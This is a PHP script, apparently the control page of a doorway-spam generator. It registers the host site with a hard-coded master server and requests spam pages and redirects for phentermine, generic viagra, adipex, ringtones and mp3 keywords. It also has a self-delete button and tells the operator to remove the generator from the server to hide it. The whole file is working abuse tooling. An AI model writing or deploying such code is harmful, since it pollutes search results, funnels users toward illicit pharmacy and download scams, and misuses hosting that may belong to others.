<?php
// REVISION: $Rev: 842 $
$masterUrl = 'http://dind.gribokhost.com/';
$useCurl = 0;

//$masterUrl = 'http://ddg.local/';
$waitTimeout = 5;

require_once('_http.php');


class TaskRequest
{
  function TaskRequest()
  {
    global $masterUrl;
    $this->masterUrl = $masterUrl;
  }
  
  function detectMyUrl()
  {
    return 'http://' . ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']) . dirname($_SERVER['PHP_SELF']) . '/';
  }
  
  function sendRequest($myUrl, $scheme, $redirect, $reportmix, $task, $keywords_per_page, $useModRewrite, $phpFilename, $mapLpp, $mapFilename, $mapTpl, $cmt, $cache_pages, $password)
  {
    global $useCurl, $waitTimeout;
    //global $scheme, $redirect, $task, $keywords_per_page;
    $reqUrl = $this->masterUrl . 'request.php';
    $post = Array(
      'scheme' => $scheme,
      'url' => $myUrl,
      'task' => $task,
      'redirect' => $redirect,
      'reportmix' => $reportmix,
      'kwpp' => $keywords_per_page,
      'use_mod_rewrite' => ($useModRewrite ? 1 : 0),
      'php_filename' => $phpFilename,
      'map_lpp' => $mapLpp,
      'map_filename' => $mapFilename,
      'map_tpl' => $mapTpl,
      'cmt' => $cmt,
      'cache_pages' => $cache_pages,
      'password' => $password
    );
    $req = new HttpRequest($useCurl ? 0 : 1, $waitTimeout);
    $res = $req->request($reqUrl, $post);
    if ($req->httpStatus < 200 || $req->httpStatus >= 300)
    {
      $res = "FAILED TO CONNECT TO MASTER SERVER: {$req->httpStatus}";
    };
    return $res;
  }
};
print <<<EOM
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head><title>Request Generation</title></head>
<body>
EOM;
$req = new TaskRequest();
if ($_REQUEST['req'] == 'send_req')
{
  if (get_magic_quotes_gpc())
  {
    $_REQUEST = array_map('stripslashes', $_REQUEST);
  };
  $res = htmlspecialchars($req->sendRequest(
                                                        $_REQUEST['url'],
                                                        $_REQUEST['scheme'],
                                                        $_REQUEST['redirect'],
                                                        $_REQUEST['reportmix'],
                                                        $_REQUEST['task'],
                                                        $_REQUEST['kwpp'],
                                                        $_REQUEST['use_mod_rewrite'],
                                                        $_REQUEST['php_filename'],
                                                        $_REQUEST['map_allow'] ? $_REQUEST['map_lpp'] : 0,
                                                        $_REQUEST['map_filename'],
                                                        $_REQUEST['map_tpl'],
                                                        $_REQUEST['cmt'],
                                                        $_REQUEST['cache_pages'],
                                                        $_REQUEST['password']
                                                        
                                    ));
  $url = htmlspecialchars($_REQUEST['url']);
  $width = strlen($url) + 15;
  $parts = parse_url($_REQUEST['url']);
  $base = htmlspecialchars($parts['path']);
  $color = preg_match('/^OK:/i', $res) ? 'blue' : 'red';
  print <<<EOM
<h3>Your request has been sent. Here follows the response from the server:</h3>
<p style="color: $color">
{$res}
</p>
<table cellpadding="0" cellspacing="0"><tr><td>
<p>If you see OK message, you should set:
<pre style="background-color: #EEEEEE; border: 1px solid #AAAAAA; padding: 10px; ">var \$myUrl = "{$url}"</pre>
in <b>index.php</b> file
EOM;

if ($_REQUEST['use_mod_rewrite'])
  print <<<EOM
, and:
<pre style="background-color: #EEEEEE; border: 1px solid #AAAAAA; padding: 10px; margin-top: 40px;">RewriteBase {$base}</pre>
in <b>.htaccess</b> file<br><br>
Then upload these files to FTP, and do not forget to delete <b>generate.php</b> from the server.
EOM;
else
  print <<<EOM
.
<br>Then upload <b>index.php</b> to FTP, and do not forget to delete <b>generate.php</b> from the server.
EOM;
print <<<EOM
</p>
 </td></tr></table>
EOM;
}
else if ($_REQUEST['kill_self'] == 'do_kill_self')
{
  if (unlink(__FILE__))
    die("OK: Deleted");
  else
    die("Error: failed to delete.");
}
else
{
  $pattern = '/generate\.html$/';
  $modRewriteSupported =  (preg_match($pattern, $_SERVER['REQUEST_URI']) || preg_match($pattern, $_SERVER['REDIRECT_URL'])) ? ' checked' : ''; 
  $url = htmlspecialchars($req->detectMyUrl());
  print <<<EOM
  <script language="javascript">
  function allowSiteMap(allow)
  {
    ctl = document.getElementById('map_filename');
    ctl.disabled = !allow;
    ctl = document.getElementById('map_lpp');
    ctl.disabled = !allow;
    ctl = document.getElementById('map_tpl');
    ctl.disabled = !allow;
};
  </script>
<form action="{$_SERVER['PHP_SELF']}" method="POST">
<input type="hidden" name="req" value="send_req"/>
<table cellpadding="2" cellspacing="0" border="0">
<tr>
  <td>Password:</td><td><input type="password" style="width: 60em;" name="password" value="{$password}"/></td>
</tr>
<tr>
  <td>URL:</td><td><input type="text" style="width: 60em;" name="url" value="{$url}"/></td>
</tr>
<tr>
  <td>Scheme:</td><td><select name="scheme"><option value="1">1</option><option value="3">3</option></select></td>
</tr>
<tr>
  <td colspan="2">Redirect:</td>
</tr>
<tr>
  <td colspan="2">
<textarea style="width: 60em; height: 4em;" wrap="off" name="redirect">pharma1:int:script.txt
ring1:ext2:http://dg.local/jscript.php?s=\${arg}
</textarea></td>
</tr>
<tr>
  <td colspan="2">Report mix:</td>
</tr>
<tr>
  <td colspan="2">
<textarea style="width: 60em; height: 4em;" wrap="off" name="reportmix">pharma1:0:buy
ring1:1:download
mp3:0:get
</textarea></td>
  </tr>
<tr>
  <td>kwpp:</td><td><input type="text" style="width: 5em;" name="kwpp" value="2-3"></td>
</tr>
<tr>
  <td colspan="2">Task:</td>
</tr>
<tr>
  <td colspan="2"><textarea  wrap="off" style="width: 60em; height: 20em;" name="task">Download ringtones, ringtones, ring1, 0
Free ringtones, ringtones, ring1, 0
Nokia ringtones, nokia, ring1, 1
Buy nokia, nokia, ring1, 1
Cheap ringtones, ringtones, ring1, 0
Buy phentermine, phentermine, pharma1, 0
Cheap phentermine, phentermine, pharma1, 0
Online phentermine, phentermine, pharma1, 0
Generic viagra, viagra, pharma1, 1
Adipex p, adipex, pharma1, 0
Cheap adipex, adipex, pharma1, 0
Sildenafil cirate, viagra, pharma1, 1

Harry's Game (Theme From),91,mp3,1,Clannad,The Ultimate Collection
Deep Forest,128,mp3,1,Deep Forest,Deep Forest
Bohemian Ballet,132,mp3,1,Deep Forest,Boheme
Marta's Song,132,mp3,1,Deep Forest,Boheme
Freedom Cry,132,mp3,1,Deep Forest,Boheme

</textarea></td>
</tr>
<tr>
  <td>Use mod_rewrite: </td><td><input type="checkbox" name="use_mod_rewrite" value="1"{$modRewriteSupported}/></td>
</tr>
<tr>
  <td>Upload generated pages to host: </td><td><input type="checkbox" name="cache_pages" value="1" checked/></td>
</tr>
<tr>
  <td>Generate site map:</td><td><input type="checkbox" name="map_allow" value="1" onclick="allowSiteMap(this.checked)" checked></td>
</tr>
<tr>
  <td>Links per map page:</td><td><input type="text" style="width: 20em;" name="map_lpp" id="map_lpp" value="30"></td>
</tr>
<tr>
  <td>Map page filename:</td><td><input type="text" style="width: 20em;" name="map_filename" id="map_filename" value="sitemap"></td>
</tr>
<tr>
  <td>Map template file:</td><td><input type="text" style="width: 20em;" name="map_tpl" id="map_tpl" value="map.txt"></td>
</tr>
<tr>
  <td>PHP filename:</td><td><input type="text" style="width: 20em;" name="php_filename" value="index.php"></td>
</tr>
<tr>
  <td colspan="2">Comments:</td>
</tr>
<tr>
  <td colspan="2"><textarea style="width: 60em; height: 5em;" name="cmt">
</textarea></td>
</tr>
<tr>
  <td colspan="2"><input type="submit" value="Send Request"/></td>
</tr>
</table>
</form>
<br><br><br>
<form action="{$_SERVER['PHP_SELF']}" method="POST">
<input type="hidden" name="kill_self" value="do_kill_self"/>
<input type="submit" value="Kill self"/>
</form>
EOM;
};

print <<<EOM
</body>
</html>
EOM;
?>